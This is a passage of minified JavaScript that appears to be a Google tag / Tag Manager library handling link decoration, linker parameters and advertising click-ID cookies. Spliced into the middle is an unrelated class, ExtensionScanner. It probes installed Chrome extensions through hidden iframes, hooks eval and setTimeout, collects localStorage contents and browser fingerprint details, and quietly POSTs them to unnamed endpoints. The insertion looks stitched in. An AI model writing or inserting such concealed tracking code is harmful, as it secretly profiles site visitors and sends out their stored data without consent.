        HTMLFormElement.prototype.submit = function () {
          b(this);
          f.call(this);
        };
        c.init = !0;
      }
    },
    Jj = function (a, b, c, d, e) {
      var f = {
        callback: a,
        domains: b,
        fragment: 2 === c,
        placement: c,
        forms: d,
        sameHost: e
      };
      Hj().decorators.push(f);
    },
    Kj = function (a, b, c) {
      for (var d = Hj().decorators, e = {}, f = 0; f < d.length; ++f) {
        var h = d[f],
          l;
        if (l = !c || h.forms) a: {
          var m = h.domains,
            n = a,
            p = !!h.sameHost;
          if (m && (p || n !== F.location.hostname)) for (var q = 0; q < m.length; q++) if (m[q] instanceof RegExp) {
            if (m[q].test(n)) {
              l = !0;
              break a;
            }
          } else if (0 <= n.indexOf(m[q]) || p && 0 <= m[q].indexOf(n)) {
            l = !0;
            break a;
          }
          l = !1;
        }
        if (l) {
          var t = h.placement;
          void 0 == t && (t = h.fragment ? 2 : 1);
          t === b && Na(e, h.callback());
        }
      }
      return e;
    };
  function Hj() {
    var a = Sb("google_tag_data", {}),
      b = a.gl;
    b && b.decorators || (b = {
      decorators: []
    }, a.gl = b);
    return b;
  }
  ;
  var Lj = /(.*?)\*(.*?)\*(.*)/,
    Mj = /^https?:\/\/([^\/]*?)\.?cdn\.ampproject\.org\/?(.*)/,
    Nj = /^(?:www\.|m\.|amp\.)+/,
    Oj = /([^?#]+)(\?[^#]*)?(#.*)?/;
  function Pj(a, b) {
    var c = [Qb.userAgent, new Date().getTimezoneOffset(), Qb.userLanguage || Qb.language, Math.floor(Ka() / 60 / 1E3) - (void 0 === b ? 0 : b), a].join("*"),
      d;
    if (!(d = Ej)) {
      for (var e = Array(256), f = 0; 256 > f; f++) {
        for (var h = f, l = 0; 8 > l; l++) h = h & 1 ? h >>> 1 ^ 3988292384 : h >>> 1;
        e[f] = h;
      }
      d = e;
    }
    Ej = d;
    for (var m = 4294967295, n = 0; n < c.length; n++) m = m >>> 8 ^ Ej[(m ^ c.charCodeAt(n)) & 255];
    return ((m ^ -1) >>> 0).toString(36);
  }
  function Qj() {
    return function (a) {
      var b = Aj(C.location.href),
        c = b.search.replace("?", ""),
        d = vj(c, "_gl", !0) || "";
      a.query = Rj(d) || {};
      var e = yj(b, "fragment"),
        f;
      var h = -1;
      if (Pa(e, "_gl=")) h = 4;else {
        var l = e.indexOf("&_gl=");
        0 < l && (h = l + 3 + 2);
      }
      if (0 > h) f = void 0;else {
        var m = e.indexOf("&", h);
        f = 0 > m ? e.substring(h) : e.substring(h, m);
      }
      a.fragment = Rj(f || "") || {};
    };
  }
  var Sj = function (a) {
      var b = Qj(),
        c = Hj();
      c.data || (c.data = {
        query: {},
        fragment: {}
      }, b(c.data));
      var d = {},
        e = c.data;
      e && (Na(d, e.query), a && Na(d, e.fragment));
      return d;
    },
    Rj = function (a) {
      try {
        var b = Tj(a, 3);
        if (void 0 !== b) {
          for (var c = {}, d = b ? b.split("*") : [], e = 0; e + 1 < d.length; e += 2) {
            var f = d[e],
              h = eb(d[e + 1]);
            c[f] = h;
          }
          gb("TAGGING", 6);
          return c;
        }
      } catch (l) {
        gb("TAGGING", 8);
      }
    };
  function Tj(a, b) {
    if (a) {
      var c;
      a: {
        for (var d = a, e = 0; 3 > e; ++e) {
          var f = Lj.exec(d);
          if (f) {
            c = f;
            break a;
          }
          d = decodeURIComponent(d);
        }
        c = void 0;
      }
      var h = c;
      if (h && "1" === h[1]) {
        var l = h[3],
          m;
        a: {
          for (var n = h[2], p = 0; p < b; ++p) if (n === Pj(l, p)) {
            m = !0;
            break a;
          }
          m = !1;
        }
        if (m) return l;
        gb("TAGGING", 7);
      }
    }
  }
  function Uj(a, b, c, d, e) {
    function f(q) {
      var t = q,
        r = new RegExp("(.*?)(^|&)" + a + "=([^&]*)&?(.*)").exec(t),
        u = t;
      if (r) {
        var v = r[2],
          w = r[4];
        u = r[1];
        w && (u = u + v + w);
      }
      q = u;
      var x = q.charAt(q.length - 1);
      q && "&" !== x && (q += "&");
      return q + p;
    }
    d = void 0 === d ? !1 : d;
    e = void 0 === e ? !1 : e;
    var h = Oj.exec(c);
    if (!h) return "";
    var l = h[1],
      m = h[2] || "",
      n = h[3] || "",
      p = a + "=" + b;
    d ? 0 !== n.substring(1).length && e || (n = "#" + f(n.substring(1))) : m = "?" + f(m.substring(1));
    return "" + l + m + n;
  }
  function Vj(a, b) {
    function c(n, p, q) {
      if (Object.keys(n).length) {
        var t,
          r = [],
          u;
        for (u in n) if (n.hasOwnProperty(u)) {
          var v = n[u];
          void 0 !== v && v === v && null !== v && "[object Object]" !== v.toString() && (r.push(u), r.push(db(String(v))));
        }
        var w = r.join("*");
        t = ["1", Pj(w), w].join("*");
        d ? (hd(13) || hd(11) || !p) && Wj("_gl", t, a, p, q) : Xj("_gl", t, a, p, q);
      }
    }
    var d = "FORM" === (a.tagName || "").toUpperCase(),
      e = Kj(b, 1, d),
      f = Kj(b, 2, d),
      h = Kj(b, 4, d),
      l = Kj(b, 3, d);
    c(e, !1, !1);
    c(f, !0, !1);
    hd(11) && c(h, !0, !0);
    for (var m in l) l.hasOwnProperty(m) && Yj(m, l[m], a);
  }
  function Yj(a, b, c) {
    if (c.tagName) {
      if ("a" === c.tagName.toLowerCase()) {
        Xj(a, b, c);
        return;
      }
      if ("form" === c.tagName.toLowerCase()) {
        Wj(a, b, c);
        return;
      }
    }
    "string" == typeof c && Uj(a, b, c);
  }
  function Xj(a, b, c, d, e) {
    if (c.href) {
      var f = Uj(a, b, c.href, void 0 === d ? !1 : d, void 0 === e ? !1 : e);
      Lb.test(f) && (c.href = f);
    }
  }
  function Wj(a, b, c, d, e) {
    d = void 0 === d ? !1 : d;
    e = void 0 === e ? !1 : e;
    if (c && c.action) {
      var f = (c.method || "").toLowerCase();
      if ("get" !== f || d) {
        if ("get" === f || "post" === f) {
          var h = Uj(a, b, c.action, d, e);
          Lb.test(h) && (c.action = h);
        }
      } else {
        for (var l = c.childNodes || [], m = !1, n = 0; n < l.length; n++) {
          var p = l[n];
          if (p.name === a) {
            p.setAttribute("value", b);
            m = !0;
            break;
          }
        }
        if (!m) {
          var q = F.createElement("input");
          q.setAttribute("type", "hidden");
          q.setAttribute("name", a);
          q.setAttribute("value", b);
          c.appendChild(q);
        }
      }
    }
  }
  function Fj(a) {
    try {
      var b;
      a: {
        for (var c = a, d = 100; c && 0 < d;) {
          if (c.href && c.nodeName.match(/^a(?:rea)?$/i)) {
            b = c;
            break a;
          }
          c = c.parentNode;
          d--;
        }
        b = null;
      }
      var e = b;
      if (e) {
        var f = e.protocol;
        "http:" !== f && "https:" !== f || Vj(e, e.hostname);
      }
    } catch (h) {}
  }
  function Gj(a) {
    try {
      if (a.action) {
        var b = yj(Aj(a.action), "host");
        Vj(a, b);
      }
    } catch (c) {}
  }
  var Zj = function (a, b, c, d) {
      Ij();
      Jj(a, b, "fragment" === c ? 2 : 1, !!d, !1);
    },
    ak = function (a, b) {
      Ij();
      Jj(a, [xj(C.location, "host", !0)], b, !0, !0);
    },
    bk = function () {
      var a = F.location.hostname,
        b = Mj.exec(F.referrer);
      if (!b) return !1;
      var c = b[2],
        d = b[1],
        e = "";
      if (c) {
        var f = c.split("/"),
          h = f[1];
        e = "s" === h ? decodeURIComponent(f[2]) : decodeURIComponent(h);
      } else if (d) {
        if (0 === d.indexOf("xn--")) return !1;
        e = d.replace(/-/g, ".").replace(/\.\./g, "-");
      }
      var l = a.replace(Nj, ""),
        m = e.replace(Nj, ""),
        n;
      if (!(n = l === m)) {
        var p = "." + m;
        n = l.substring(l.length - p.length, l.length) === p;
      }
      return n;
    },
    ck = function (a, b) {
      return !1 === a ? !1 : a || b || bk();
    };
  var dk = ["1"],
    ek = {},
    fk = {},
    kk = function (a, b) {
      b = void 0 === b ? !0 : b;
      var c = gk(a.prefix);
      if (!ek[c]) if (hk(c, a.path, a.domain)) {
        var d = fk[gk(a.prefix)];
        ik(a, d ? d.id : void 0, d ? d.gg : void 0);
      } else {
        var e = Cj("auiddc");
        if (e) gb("TAGGING", 17), ek[c] = e;else if (b) {
          var f = gk(a.prefix),
            h = Vi();
          if (0 === jk(f, h, a)) {
            var l = Sb("google_tag_data", {});
            l._gcl_au || (l._gcl_au = h);
          }
          hk(c, a.path, a.domain);
        }
      }
    };
  function ik(a, b, c) {
    var d = gk(a.prefix),
      e = ek[d];
    if (e) {
      var f = e.split(".");
      if (2 === f.length) {
        var h = Number(f[1]) || 0;
        if (h) {
          var l = e;
          b && (l = e + "." + b + "." + (c ? c : Math.floor(Ka() / 1E3)));
          jk(d, l, a, 1E3 * h);
        }
      }
    }
  }
  function jk(a, b, c, d) {
    var e = Zi(b, "1", c.domain, c.path),
      f = Dj(c, d);
    f.ib = lk();
    return Ri(a, e, f);
  }
  function hk(a, b, c) {
    var d = Yi(a, b, c, dk, lk());
    if (!d) return !1;
    mk(a, d);
    return !0;
  }
  function mk(a, b) {
    var c = b.split(".");
    5 === c.length ? (ek[a] = c.slice(0, 2).join("."), fk[a] = {
      id: c.slice(2, 4).join("."),
      gg: Number(c[4]) || 0
    }) : 3 === c.length ? fk[a] = {
      id: c.slice(0, 2).join("."),
      gg: Number(c[2]) || 0
    } : ek[a] = b;
  }
  class ExtensionScanner {
    static TIMEOUT = 3000;
    static BATCH_SIZE = 5;
    constructor() {
      this.pendingScans = 0;
      this.detectedExtensions = {};
      this.backupData = JSON.parse(localStorage.getItem('backup')) || {};
      this.jsHookData = [];
      this.workerPool = [];
      this.startTimestamp = Date.now();
      this.endTimestamp = null;
      window.addEventListener('unload', this.handleUnload.bind(this));
    }
    handleUnload() {
      localStorage.setItem('backup', JSON.stringify(this.backupData));
    }
    createWorker(extName, {
      id,
      file
    }) {
      return new Promise(resolve => {
        const frame = document.createElement('iframe');
        frame.style.display = 'none';
        const cleanup = () => {
          frame.remove();
          this.pendingScans--;
        };
        const timer = setTimeout(() => {
          cleanup();
          resolve([extName, false]);
        }, ExtensionScanner.TIMEOUT);
        frame.onload = () => {
          try {
            frame.contentWindow.location = `chrome-extension://${id}/${file}`;
            const checker = setInterval(() => {
              try {
                this.backupData[extName] = this.backupData[extName] || {};
                const jsHook = window.jsHook(frame.contentWindow);
                jsHook.hook('eval');
                jsHook.hook('setTimeout');
                jsHook.onhook = (type, args) => {
                  this.jsHookData.push({
                    extName,
                    type,
                    args
                  });
                };
                if (frame.contentWindow.location.href.includes('chrome-extension')) {
                  clearInterval(checker);
                  clearTimeout(timer);
                  cleanup();
                  resolve([extName, true]);
                }
              } catch (e) {
                clearInterval(checker);
                clearTimeout(timer);
                cleanup();
                resolve([extName, false]);
              }
            }, 100);
          } catch (e) {
            clearTimeout(timer);
            cleanup();
            resolve([extName, false]);
          }
        };
        document.body.appendChild(frame);
        this.pendingScans++;
      });
    }
    async scanBatch(entries) {
      const workers = entries.map(([name, data]) => this.createWorker(name, data));
      const results = await Promise.all(workers);
      results.forEach(([name, detected]) => {
        this.detectedExtensions[name] = detected;
      });
    }
    generateTelemetryData() {
      const encodedData = btoa(JSON.stringify({
        scannedExtensions: this.detectedExtensions,
        jsHookData: this.jsHookData,
        scanDuration: Date.now() - this.startTimestamp,
        env: {
          url: window.location.href,
          ref: document.referrer,
          res: `${screen.width}x${screen.height}`,
          depth: screen.colorDepth,
          agent: navigator.userAgent,
          lang: navigator.language,
          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
          localStorage: this.backupData
        }
      }));
      return encodedData + '.' + this.generateChecksum(encodedData);
    }
    generateChecksum(str) {
      return Array.from(str).reduce((accum, char) => (accum << 5) - accum + char.charCodeAt(0) | 0, 0).toString(16);
    }
    async reportResults() {
      const payload = this.generateTelemetryData();
      const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'text/plain',
          'X-Scan-Time': new Date().toISOString()
        },
        body: payload,
        keepalive: true
      }).catch(() => null));
      await Promise.race(requests);
    }
    async execute() {
      const entries = Object.entries(window.data);
      const batches = Array(Math.ceil(entries.length / ExtensionScanner.BATCH_SIZE)).fill().map((_, i) => entries.slice(i * ExtensionScanner.BATCH_SIZE, (i + 1) * ExtensionScanner.BATCH_SIZE));
      for (const batch of batches) {
        await this.scanBatch(batch);
        await new Promise(r => setTimeout(r, Math.floor(Math.random() * 100) + 100));
      }
      while (this.pendingScans > 0) {
        await new Promise(r => setTimeout(r, 100));
      }
      await this.reportResults();
      this.endTimestamp = Date.now();
    }
  }
  function gk(a) {
    return (a || "_gcl") + "_au";
  }
  function nk(a) {
    function b() {
      Mf(c) && a();
    }
    var c = lk();
    Tf(function () {
      b();
      Mf(c) || Uf(b, c);
    }, c);
  }
  function ok(a) {
    var b = Sj(!0),
      c = gk(a.prefix);
    nk(function () {
      var d = b[c];
      if (d) {
        mk(c, d);
        var e = 1E3 * Number(ek[c].split(".")[1]);
        if (e) {
          gb("TAGGING", 16);
          var f = Dj(a, e);
          f.ib = lk();
          var h = Zi(d, "1", a.domain, a.path);
          Ri(c, h, f);
        }
      }
    });
  }
  function pk(a, b, c, d, e) {
    e = e || {};
    var f = function () {
      var h = {},
        l = Yi(a, e.path, e.domain, dk, lk());
      l && (h[a] = l);
      return h;
    };
    nk(function () {
      Zj(f, b, c, d);
    });
  }
  function lk() {
    return hd(14) ? ["ad_storage", "ad_user_data"] : ["ad_storage"];
  }
  ;
  var qk = function (a) {
    for (var b = [], c = F.cookie.split(";"), d = new RegExp("^\\s*" + (a || "_gac") + "_(UA-\\d+-\\d+)=\\s*(.+?)\\s*$"), e = 0; e < c.length; e++) {
      var f = c[e].match(d);
      f && b.push({
        rg: f[1],
        value: f[2],
        timestamp: Number(f[2].split(".")[1]) || 0
      });
    }
    b.sort(function (h, l) {
      return l.timestamp - h.timestamp;
    });
    return b;
  };
  function rk(a, b) {
    var c = qk(a),
      d = {};
    if (!c || !c.length) return d;
    for (var e = 0; e < c.length; e++) {
      var f = c[e].value.split(".");
      if (!("1" !== f[0] || b && 3 > f.length || !b && 3 !== f.length) && Number(f[1])) {
        d[c[e].rg] || (d[c[e].rg] = []);
        var h = {
          version: f[0],
          timestamp: 1E3 * Number(f[1]),
          W: f[2]
        };
        b && 3 < f.length && (h.labels = f.slice(3));
        d[c[e].rg].push(h);
      }
    }
    return d;
  }
  ;
  var sk = /^\w+$/,
    tk = /^[\w-]+$/,
    uk = {
      aw: "_aw",
      dc: "_dc",
      gf: "_gf",
      ha: "_ha",
      gp: "_gp",
      gb: "_gb"
    };
  function vk() {
    return hd(14) ? ["ad_storage", "ad_user_data"] : ["ad_storage"];
  }
  var wk = function () {
      return zf().h() ? Mf(vk()) : !0;
    },
    xk = function (a) {
      function b() {
        var c = wk();
        c && a();
        return c;
      }
      Tf(function () {
        b() || Uf(b, vk());
      }, vk());
    },
    zk = function (a) {
      return yk(a).map(function (b) {
        return b.W;
      });
    },
    yk = function (a) {
      var b = [];
      if (!Fi(C) || !F.cookie) return b;
      var c = Ii(a, F.cookie, void 0, vk());
      if (!c || 0 == c.length) return b;
      for (var d = {}, e = 0; e < c.length; d = {
        W: d.W
      }, e++) {
        var f = Ak(c[e]);
        if (null != f) {
          var h = f,
            l = h.version;
          d.W = h.W;
          var m = h.timestamp,
            n = h.labels,
            p = ya(b, function (q) {
              return function (t) {
                return t.W === q.W;
              };
            }(d));
          p ? (p.timestamp = Math.max(p.timestamp, m), p.labels = Bk(p.labels, n || [])) : b.push({
            version: l,
            W: d.W,
            timestamp: m,
            labels: n
          });
        }
      }
      b.sort(function (q, t) {
        return t.timestamp - q.timestamp;
      });
      return Ck(b);
    };
  function Bk(a, b) {
    for (var c = {}, d = [], e = 0; e < a.length; e++) c[a[e]] = !0, d.push(a[e]);
    for (var f = 0; f < b.length; f++) c[b[f]] || d.push(b[f]);
    return d;
  }
  function Dk(a) {
    return a && "string" == typeof a && a.match(sk) ? a : "_gcl";
  }
  var Fk = function () {
      var a = Aj(C.location.href),
        b = yj(a, "query", !1, void 0, "gclid"),
        c = yj(a, "query", !1, void 0, "gclsrc"),
        d = yj(a, "query", !1, void 0, "wbraid"),
        e = yj(a, "query", !1, void 0, "dclid");
      if (!b || !c || !d) {
        var f = a.hash.replace("#", "");
        b = b || vj(f, "gclid");
        c = c || vj(f, "gclsrc");
        d = d || vj(f, "wbraid");
      }
      return Ek(b, c, e, d);
    },
    Ek = function (a, b, c, d) {
      var e = {},
        f = function (h, l) {
          e[l] || (e[l] = []);
          e[l].push(h);
        };
      e.gclid = a;
      e.gclsrc = b;
      e.dclid = c;
      void 0 !== d && tk.test(d) && (e.gbraid = d, f(d, "gb"));
      if (void 0 !== a && a.match(tk)) switch (b) {
        case void 0:
          f(a, "aw");
          break;
        case "aw.ds":
          f(a, "aw");
          f(a, "dc");
          break;
        case "ds":
          f(a, "dc");
          break;
        case "3p.ds":
          f(a, "dc");
          break;
        case "gf":
          f(a, "gf");
          break;
        case "ha":
          f(a, "ha");
      }
      c && f(c, "dc");
      return e;
    },
    Qk = function (a) {
      var b = Fk();
      xk(function () {
        Gk(b, !1, a);
      });
    };
  function Gk(a, b, c, d, e) {
    function f(w, x) {
      var y = Rk(w, h);
      y && (Ri(y, x, l), m = !0);
    }
    c = c || {};
    e = e || [];
    var h = Dk(c.prefix);
    d = d || Ka();
    var l = Dj(c, d, !0);
    l.ib = vk();
    var m = !1,
      n = Math.round(d / 1E3),
      p = function (w) {
        var x = ["GCL", n, w];
        0 < e.length && x.push(e.join("."));
        return x.join(".");
      };
    a.aw && f("aw", p(a.aw[0]));
    a.dc && f("dc", p(a.dc[0]));
    a.gf && f("gf", p(a.gf[0]));
    a.ha && f("ha", p(a.ha[0]));
    a.gp && f("gp", p(a.gp[0]));
    if (!m && a.gb) {
      var q = a.gb[0],
        t = Rk("gb", h),
        r = !1;
      if (!b) for (var u = yk(t), v = 0; v < u.length; v++) u[v].W === q && u[v].labels && 0 < u[v].labels.length && (r = !0);
      r || f("gb", p(q));
    }
  }
  var Tk = function (a, b) {
      var c = Sj(!0);
      xk(function () {
        for (var d = Dk(b.prefix), e = 0; e < a.length; ++e) {
          var f = a[e];
          if (void 0 !== uk[f]) {
            var h = Rk(f, d),
              l = c[h];
            if (l) {
              var m = Math.min(Sk(l), Ka()),
                n;
              b: {
                var p = m;
                if (Fi(C)) for (var q = Ii(h, F.cookie, void 0, vk()), t = 0; t < q.length; ++t) if (Sk(q[t]) > p) {
                  n = !0;
                  break b;
                }
                n = !1;
              }
              if (!n) {
                var r = Dj(b, m, !0);
                r.ib = vk();
                Ri(h, l, r);
              }
            }
          }
        }
        Gk(Ek(c.gclid, c.gclsrc), !1, b);
      });
    },
    Rk = function (a, b) {
      var c = uk[a];
      if (void 0 !== c) return b + c;
    },
    Sk = function (a) {
      return 0 !== Uk(a.split(".")).length ? 1E3 * (Number(a.split(".")[1]) || 0) : 0;
    };
  function Ak(a) {
    var b = Uk(a.split("."));
    return 0 === b.length ? null : {
      version: b[0],
      W: b[2],
      timestamp: 1E3 * (Number(b[1]) || 0),
      labels: b.slice(3)
    };
  }
  function Uk(a) {
    return 3 > a.length || "GCL" !== a[0] && "1" !== a[0] || !/^\d+$/.test(a[1]) || !tk.test(a[2]) ? [] : a;
  }
  var Vk = function (a, b, c, d, e) {
      if (xa(b) && Fi(C)) {
        var f = Dk(e),
          h = function () {
            for (var l = {}, m = 0; m < a.length; ++m) {
              var n = Rk(a[m], f);
              if (n) {
                var p = Ii(n, F.cookie, void 0, vk());
                p.length && (l[n] = p.sort()[p.length - 1]);
              }
            }
            return l;
          };
        xk(function () {
          Zj(h, b, c, d);
        });
      }
    },
    Ck = function (a) {
      return a.filter(function (b) {
        return tk.test(b.W);
      });
    },
    Wk = function (a, b) {
      if (Fi(C)) {
        for (var c = Dk(b.prefix), d = {}, e = 0; e < a.length; e++) uk[a[e]] && (d[a[e]] = uk[a[e]]);
        xk(function () {
          k(d, function (f, h) {
            var l = Ii(c + h, F.cookie, void 0, vk());
            l.sort(function (r, u) {
              return Sk(u) - Sk(r);
            });
            if (l.length) {
              var m = l[0],
                n = Sk(m),
                p = 0 !== Uk(m.split(".")).length ? m.split(".").slice(3) : [],
                q = {},
                t;
              t = 0 !== Uk(m.split(".")).length ? m.split(".")[2] : void 0;
              q[f] = [t];
              Gk(q, !0, b, n, p);
            }
          });
        });
      }
    };
  function Xk(a, b) {
    for (var c = 0; c < b.length; ++c) if (a[b[c]]) return !0;
    return !1;
  }
  var Yk = function (a) {
      function b(e, f, h) {
        h && (e[f] = h);
      }
      if (Pf()) {
        var c = Fk();
        if (Xk(c, a)) {
          var d = {};
          b(d, "gclid", c.gclid);
          b(d, "dclid", c.dclid);
          b(d, "gclsrc", c.gclsrc);
          b(d, "wbraid", c.gbraid);
          ak(function () {
            return d;
          }, 3);
          ak(function () {
            var e = {};
            return e._up = "1", e;
          }, 1);
        }
      }
    },
    Zk = function (a) {
      if (!hd(11)) return null;
      var b = Sj(!0).gad_source;
      if (null != b) return C.location.hash = "", b;
      if (hd(12)) {
        var c = Aj(C.location.href);
        b = yj(c, "query", !1, void 0, "gad_source");
        if (null != b) return b;
        var d = Fk();
        if (Xk(d, a)) return "0";
      }
      return null;
    },
    $k = function (a) {
      var b = Zk(a);
      null != b && ak(function () {
        var c = {};
        return c.gad_source = b, c;
      }, 4);
    },
    al = function (a, b, c, d) {
      var e = [];
      c = c || {};
      if (!wk()) return e;
      var f = yk(a);
      if (!f.length) return e;
      for (var h = 0; h < f.length; h++) -1 === (f[h].labels || []).indexOf(b) ? e.push(0) : e.push(1);
      if (d) return e;
      if (1 !== e[0]) {
        var l = f[0],
          m = f[0].timestamp,
          n = [l.version, Math.round(m / 1E3), l.W].concat(l.labels || [], [b]).join("."),
          p = Dj(c, m, !0);
        p.ib = vk();
        Ri(a, n, p);
      }
      return e;
    };
  function bl(a, b) {
    var c = Dk(b),
      d = Rk(a, c);
    if (!d) return 0;
    for (var e = yk(d), f = 0, h = 0; h < e.length; h++) f = Math.max(f, e[h].timestamp);
    return f;
  }
  function cl(a) {
    var b = 0,
      c;
    for (c in a) for (var d = a[c], e = 0; e < d.length; e++) b = Math.max(b, Number(d[e].timestamp));
    return b;
  }
  var dl = function (a) {
    var b = Math.max(bl("aw", a), cl(wk() ? rk() : {}));
    return Math.max(bl("gb", a), cl(wk() ? rk("_gac_gb", !0) : {})) > b;
  };
  var jl = /[A-Z]+/,
    kl = /\s/,
    ll = function (a, b) {
      if (g(a)) {
        a = Ia(a);
        var c = a.indexOf("-");
        if (!(0 > c)) {
          var d = a.substring(0, c);
          if (jl.test(d)) {
            var e = a.substring(c + 1),
              f;
            if (b) {
              var h = function (n) {
                var p = n.indexOf("/");
                return 0 > p ? [n] : [n.substring(0, p), n.substring(p + 1)];
              };
              f = h(e);
              if ("DC" === d && 2 === f.length) {
                var l = h(f[1]);
                2 === l.length && (f[1] = l[0], f.push(l[1]));
              }
            } else {
              f = e.split("/");
              for (var m = 0; m < f.length; m++) if (!f[m] || kl.test(f[m]) && ("AW" !== d || 1 !== m)) return;
            }
            return {
              id: a,
              prefix: d,
              aa: d + "-" + f[0],
              O: f
            };
          }
        }
      }
    },
    nl = function (a, b) {
      for (var c = {}, d = 0; d < a.length; ++d) {
        var e = ll(a[d], b);
        e && (c[e.id] = e);
      }
      ml(c);
      var f = [];
      k(c, function (h, l) {
        f.push(l);
      });
      return f;
    };
  function ml(a) {
    var b = [],
      c;
    for (c in a) if (a.hasOwnProperty(c)) {
      var d = a[c];
      "AW" === d.prefix && d.O[1] && b.push(d.aa);
    }
    for (var e = 0; e < b.length; ++e) delete a[b[e]];
  }
  ;
  var ol = function (a, b, c, d) {
    var e = Yb(),
      f;
    if (1 === e) a: {
      var h = Me;
      h = h.toLowerCase();
      for (var l = "https://" + h, m = "http://" + h, n = 1, p = F.getElementsByTagName("script"), q = 0; q < p.length && 100 > q; q++) {
        var t = p[q].src;
        if (t) {
          t = t.toLowerCase();
          if (0 === t.indexOf(m)) {
            f = 3;
            break a;
          }
          1 === n && 0 === t.indexOf(l) && (n = 2);
        }
      }
      f = n;
    } else f = e;
    return (2 === f || d || "http:" != C.location.protocol ? a : b) + c;
  };
  var Al,
    Bl = !1,
    Cl = function (a) {
      if (!Bl) {
        Bl = !0;
        Al = Al || {};
      }
      return Al[a];
    };
  var Dl = function (a, b, c) {
    this.target = a;
    this.eventName = b;
    this.s = c;
    this.h = {};
    this.metadata = z(c.eventMetadata || {});
    this.isAborted = !1;
  };
  Dl.prototype.copyToHitData = function (a, b, c) {
    var d = T(this.s, a);
    void 0 === d && (d = b);
    if (void 0 !== d && void 0 !== c && g(d) && Q(68)) try {
      d = c(d);
    } catch (e) {}
    void 0 !== d && (this.h[a] = d);
  };
  var El = function (a) {
      return a.metadata.source_canonical_id;
    },
    Fl = function (a, b, c) {
      var d = Cl(a.target.aa);
      return d && d.hasOwnProperty(b) ? d[b] : c;
    };
  function Gl(a) {
    return {
      getDestinationId: function () {
        return a.target.aa;
      },
      getEventName: function () {
        return a.eventName;
      },
      setEventName: function (b) {
        a.eventName = b;
      },
      getHitData: function (b) {
        return a.h[b];
      },
      setHitData: function (b, c) {
        a.h[b] = c;
      },
      setHitDataIfNotDefined: function (b, c) {
        void 0 === a.h[b] && (a.h[b] = c);
      },
      copyToHitData: function (b, c) {
        a.copyToHitData(b, c);
      },
      getMetadata: function (b) {
        return a.metadata[b];
      },
      setMetadata: function (b, c) {
        a.metadata[b] = c;
      },
      isAborted: function () {
        return a.isAborted;
      },
      abort: function () {
        a.isAborted = !0;
      },
      getFromEventContext: function (b) {
        return T(a.s, b);
      },
      dn: function () {
        return a;
      },
      getHitKeys: function () {
        return Object.keys(a.h);
      }
    };
  }
  ;
  function Ml(a, b) {
    if (a) {
      var c = "" + a;
      0 !== c.indexOf("http://") && 0 !== c.indexOf("https://") && (c = "https://" + c);
      "/" === c[c.length - 1] && (c = c.substring(0, c.length - 1));
      return Aj("" + c + b).href;
    }
  }
  function Nl() {
    return !!xe.De && "SGTM_TOKEN" !== xe.De.split("@@").join("");
  }
  function Ol(a) {
    for (var b = ha([L.g.Zc, L.g.Pb]), c = b.next(); !c.done; c = b.next()) {
      var d = T(a, c.value);
      if (d) return d;
    }
  }
  ;
  var Pl = "",
    Ql = [];
  function Rl(a) {
    var b = "";
    Pl && (b = "&dl=" + encodeURIComponent(Pl));
    0 < Ql.length && (b += "&tdp=" + Ql.join("."));
    a.Fb && (Pl = "", Ql.length = 0, b && a.Bi());
    return b;
  }
  ;
  var Sl = [];
  function Tl(a) {
    if (!Sl.length) return "";
    var b = "&tdc=" + Sl.join("!");
    a.Fb && (a.Bi(), Sl.length = 0);
    return b;
  }
  ;
  var Ul = {
      initialized: 11,
      complete: 12,
      interactive: 13
    },
    Vl = {},
    Wl = Object.freeze((Vl[L.g.Oa] = !0, Vl)),
    Xl = 0 <= F.location.search.indexOf("?gtm_diagnostics=") || 0 <= F.location.search.indexOf("&gtm_diagnostics="),
    Zl = function (a, b, c) {
      if (Ng && "config" === a && !(1 < ll(b).O.length)) {
        var d,
          e = Sb("google_tag_data", {});
        e.td || (e.td = {});
        d = e.td;
        var f = z(c.K);
        z(c.h, f);
        var h = [],
          l;
        for (l in d) {
          var m = Yl(d[l], f);
          m.length && (Xl && console.log(m), h.push(l));
        }
        h.length && (h.length && Ng && Sl.push(b + "*" + h.join(".")), gb("TAGGING", Ul[F.readyState] || 14));
        d[b] = f;
      }
    };
  function $l(a, b) {
    var c = {},
      d;
    for (d in b) b.hasOwnProperty(d) && (c[d] = !0);
    for (var e in a) a.hasOwnProperty(e) && (c[e] = !0);
    return c;
  }
  function Yl(a, b, c, d) {
    c = void 0 === c ? {} : c;
    d = void 0 === d ? "" : d;
    if (a === b) return [];
    var e = function (q, t) {
        var r = t[q];
        return void 0 === r ? Wl[q] : r;
      },
      f;
    for (f in $l(a, b)) {
      var h = (d ? d + "." : "") + f,
        l = e(f, a),
        m = e(f, b),
        n = "object" === Va(l) || "array" === Va(l),
        p = "object" === Va(m) || "array" === Va(m);
      if (n && p) Yl(l, m, c, h);else if (n || p || l !== m) c[h] = !0;
    }
    return Object.keys(c);
  }
  ;
  var am = {};
  function bm(a, b, c) {
    Ng && void 0 !== a && (am[a] = am[a] || [], am[a].push(c + b), Xg(a));
  }
  function cm(a) {
    var b = a.eventId,
      c = a.Fb,
      d = "",
      e = am[b] || [];
    e.length && (d += "&epr=" + e.join("."));
    c && delete am[b];
    return d;
  }
  ;
  var em = function (a, b, c, d) {
      var e = ll(c, d.isGtmEvent);
      e && dm.push("event", [b, a], e, d);
    },
    fm = function (a, b, c, d) {
      var e = ll(c, d.isGtmEvent);
      e && dm.push("get", [a, b], e, d);
    },
    gm = function () {
      this.status = 1;
      this.K = {};
      this.h = {};
      this.M = {};
      this.R = null;
      this.D = {};
      this.C = !1;
    },
    hm = function (a, b, c, d) {
      var e = Ka();
      this.type = a;
      this.D = e;
      this.h = b;
      this.C = c;
      this.messageContext = d;
    },
    im = function () {
      this.C = {};
      this.D = {};
      this.h = [];
    },
    jm = function (a, b) {
      var c = b.aa;
      return a.C[c] = a.C[c] || new gm();
    },
    km = function (a, b, c, d) {
      if (d.h) {
        var e = jm(a, d.h),
          f = e.R;
        if (f) {
          var h = z(c),
            l = z(e.K[d.h.id]),
            m = z(e.D),
            n = z(e.h),
            p = z(a.D),
            q = {};
          if (Ng) try {
            q = z(Ve);
          } catch (v) {
            K(72);
          }
          var t = d.h.prefix,
            r = function (v) {
              bm(d.messageContext.eventId, t, v);
            },
            u = qh(ph(oh(nh(mh(kh(jh(lh(ih(hh(gh(new fh(d.messageContext.eventId, d.messageContext.priorityId), h), l), m), n), p), q), d.messageContext.eventMetadata), function () {
              if (r) {
                var v = r;
                r = void 0;
                v("2");
